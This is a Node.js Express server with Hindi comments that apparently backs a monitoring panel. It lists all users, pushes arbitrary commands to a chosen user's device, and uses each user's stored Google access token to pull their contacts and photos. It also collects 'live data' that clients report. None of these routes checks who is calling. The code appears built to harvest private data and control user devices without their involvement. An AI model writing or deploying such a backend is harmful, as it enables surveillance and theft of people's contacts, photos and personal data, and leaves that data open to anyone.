// =================================================================
// 1. आवश्यक पैकेज (Dependencies) को इम्पोर्ट करें
// =================================================================
const express = require('express');
const webpush = require('web-push');
const bodyParser = require('body-parser');
const path = require('path');
const admin = require('firebase-admin');
// सबसे ज़रूरी नया पैकेज: गूगल की आधिकारिक लाइब्रेरी
const { google } = require('googleapis');

// =================================================================
// 2. Firebase एडमिन को शुरू करना (अपरिवर्तित)
// =================================================================
try {
    const serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT_KEY);
    admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
    const db = admin.firestore();
    console.log("Firebase Admin सफलतापूर्वक शुरू हो गया है।");
} catch (error) {
    console.error("Firebase Admin को शुरू करने में विफल:", error);
    process.exit(1);
}

// =================================================================
// 3. सर्वर और VAPID कुंजियों को सेटअप करें (अपरिवर्तित)
// =================================================================
const app = express();
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

const publicVapidKey = process.env.PUBLIC_VAPID_KEY;
const privateVapidKey = process.env.PRIVATE_VAPID_KEY;

webpush.setVapidDetails('mailto:your-email@example.com', publicVapidKey, privateVapidKey);

// =================================================================
// 4. API रूट्स (Endpoints) - अब गूगल डेटा के लिए नए रूट्स के साथ
// =================================================================

let reportedData = [];

// ---- रूट 1: एडमिन पैनल के लिए सभी उपयोगकर्ताओं की लिस्ट लाना (अपरिवर्तित) ----
app.get('/get-users', async (req, res) => {
    try {
        const usersSnapshot = await admin.firestore().collection('users').orderBy('lastLogin', 'desc').get();
        const users = usersSnapshot.docs.map(doc => ({
            uid: doc.id,
            ...doc.data()
        }));
        res.status(200).json(users.map(u => ({ uid: u.uid, displayName: u.displayName, email: u.email, photoURL: u.photoURL })));
    } catch (error) {
        console.error("उपयोगकर्ताओं को लाने में त्रुटि:", error);
        res.status(500).json({ error: 'Failed to fetch users.' });
    }
});

// ---- रूट 2: किसी चुने हुए उपयोगकर्ता को कमांड भेजना (अपरिवर्तित) ----
app.post('/send-command', async (req, res) => {
    const { userId, command } = req.body;
    try {
        const userDoc = await admin.firestore().collection('users').doc(userId).get();
        if (!userDoc.exists) return res.status(404).json({ error: 'User not found.' });
        const { pushSubscription } = userDoc.data();
        if (!pushSubscription) return res.status(400).json({ error: 'User not subscribed.' });
        
        await webpush.sendNotification(pushSubscription, JSON.stringify(command));
        res.status(200).json({ success: true });
    } catch (error) {
        console.error("कमांड भेजने में त्रुटि:", error);
        res.status(500).json({ error: 'Failed to send command.' });
    }
});

// ==========================================================================
// === बदलाव यहाँ से शुरू होता है: गूगल डेटा प्राप्त करने के लिए नए रूट्स ===
// ==========================================================================

// ---- रूट 3: किसी उपयोगकर्ता के गूगल कॉन्टैक्ट्स लाना ----
app.get('/get-contacts/:userId', async (req, res) => {
    const { userId } = req.params;
    try {
        const userDoc = await admin.firestore().collection('users').doc(userId).get();
        if (!userDoc.exists) return res.status(404).json({ error: 'User not found.' });
        
        const { googleAccessToken } = userDoc.data();
        if (!googleAccessToken) return res.status(400).json({ error: 'User has no access token.' });

        const oauth2Client = new google.auth.OAuth2();
        oauth2Client.setCredentials({ access_token: googleAccessToken });

        const people = google.people({ version: 'v1', auth: oauth2Client });
        const response = await people.people.connections.list({
            resourceName: 'people/me',
            personFields: 'names,emailAddresses,phoneNumbers',
        });
        
        res.status(200).json(response.data.connections || []);

    } catch (error) {
        console.error("कॉन्टैक्ट्स लाने में त्रुटि:", error);
        res.status(500).json({ error: 'Failed to fetch contacts.' });
    }
});

// ---- रूट 4: किसी उपयोगकर्ता की गूगल फोटोज लाना ----
app.get('/get-photos/:userId', async (req, res) => {
    const { userId } = req.params;
    try {
        const userDoc = await admin.firestore().collection('users').doc(userId).get();
        if (!userDoc.exists) return res.status(404).json({ error: 'User not found.' });

        const { googleAccessToken } = userDoc.data();
        if (!googleAccessToken) return res.status(400).json({ error: 'User has no access token.' });
        
        // Photos API का उपयोग करने के लिए आपको Google Cloud में Photos Library API को सक्षम करना होगा
        const oauth2Client = new google.auth.OAuth2();
        oauth2Client.setCredentials({ access_token: googleAccessToken });
        
        // यह एक अनौपचारिक तरीका है Photos API को Node.js में इस्तेमाल करने का
        const photoApiUrl = 'https://photoslibrary.googleapis.com/v1/mediaItems?pageSize=50';
        const photoResponse = await fetch(photoApiUrl, {
            headers: { 'Authorization': `Bearer ${googleAccessToken}` }
        });
        const photoData = await photoResponse.json();

        res.status(200).json(photoData.mediaItems || []);

    } catch (error) {
        console.error("फोटोज लाने में त्रुटि:", error);
        res.status(500).json({ error: 'Failed to fetch photos.' });
    }
});


// ---- रूट 5 और 6 (अपरिवर्तित) - लाइव डेटा को संभालने के लिए ----
app.post('/report-data', (req, res) => {
    const data = req.body;
    data.timestamp = new Date().toISOString();
    reportedData.push(data);
    res.status(200).json({ status: 'success' });
});

app.get('/get-reported-data', (req, res) => {
    res.status(200).json(reportedData);
    reportedData = []; // डेटा भेजने के बाद उसे खाली कर दें
});

// =================================================================
// 6. सर्वर को शुरू करना
// =================================================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`सर्वर पोर्ट ${PORT} पर शुरू हो गया है।`);
});
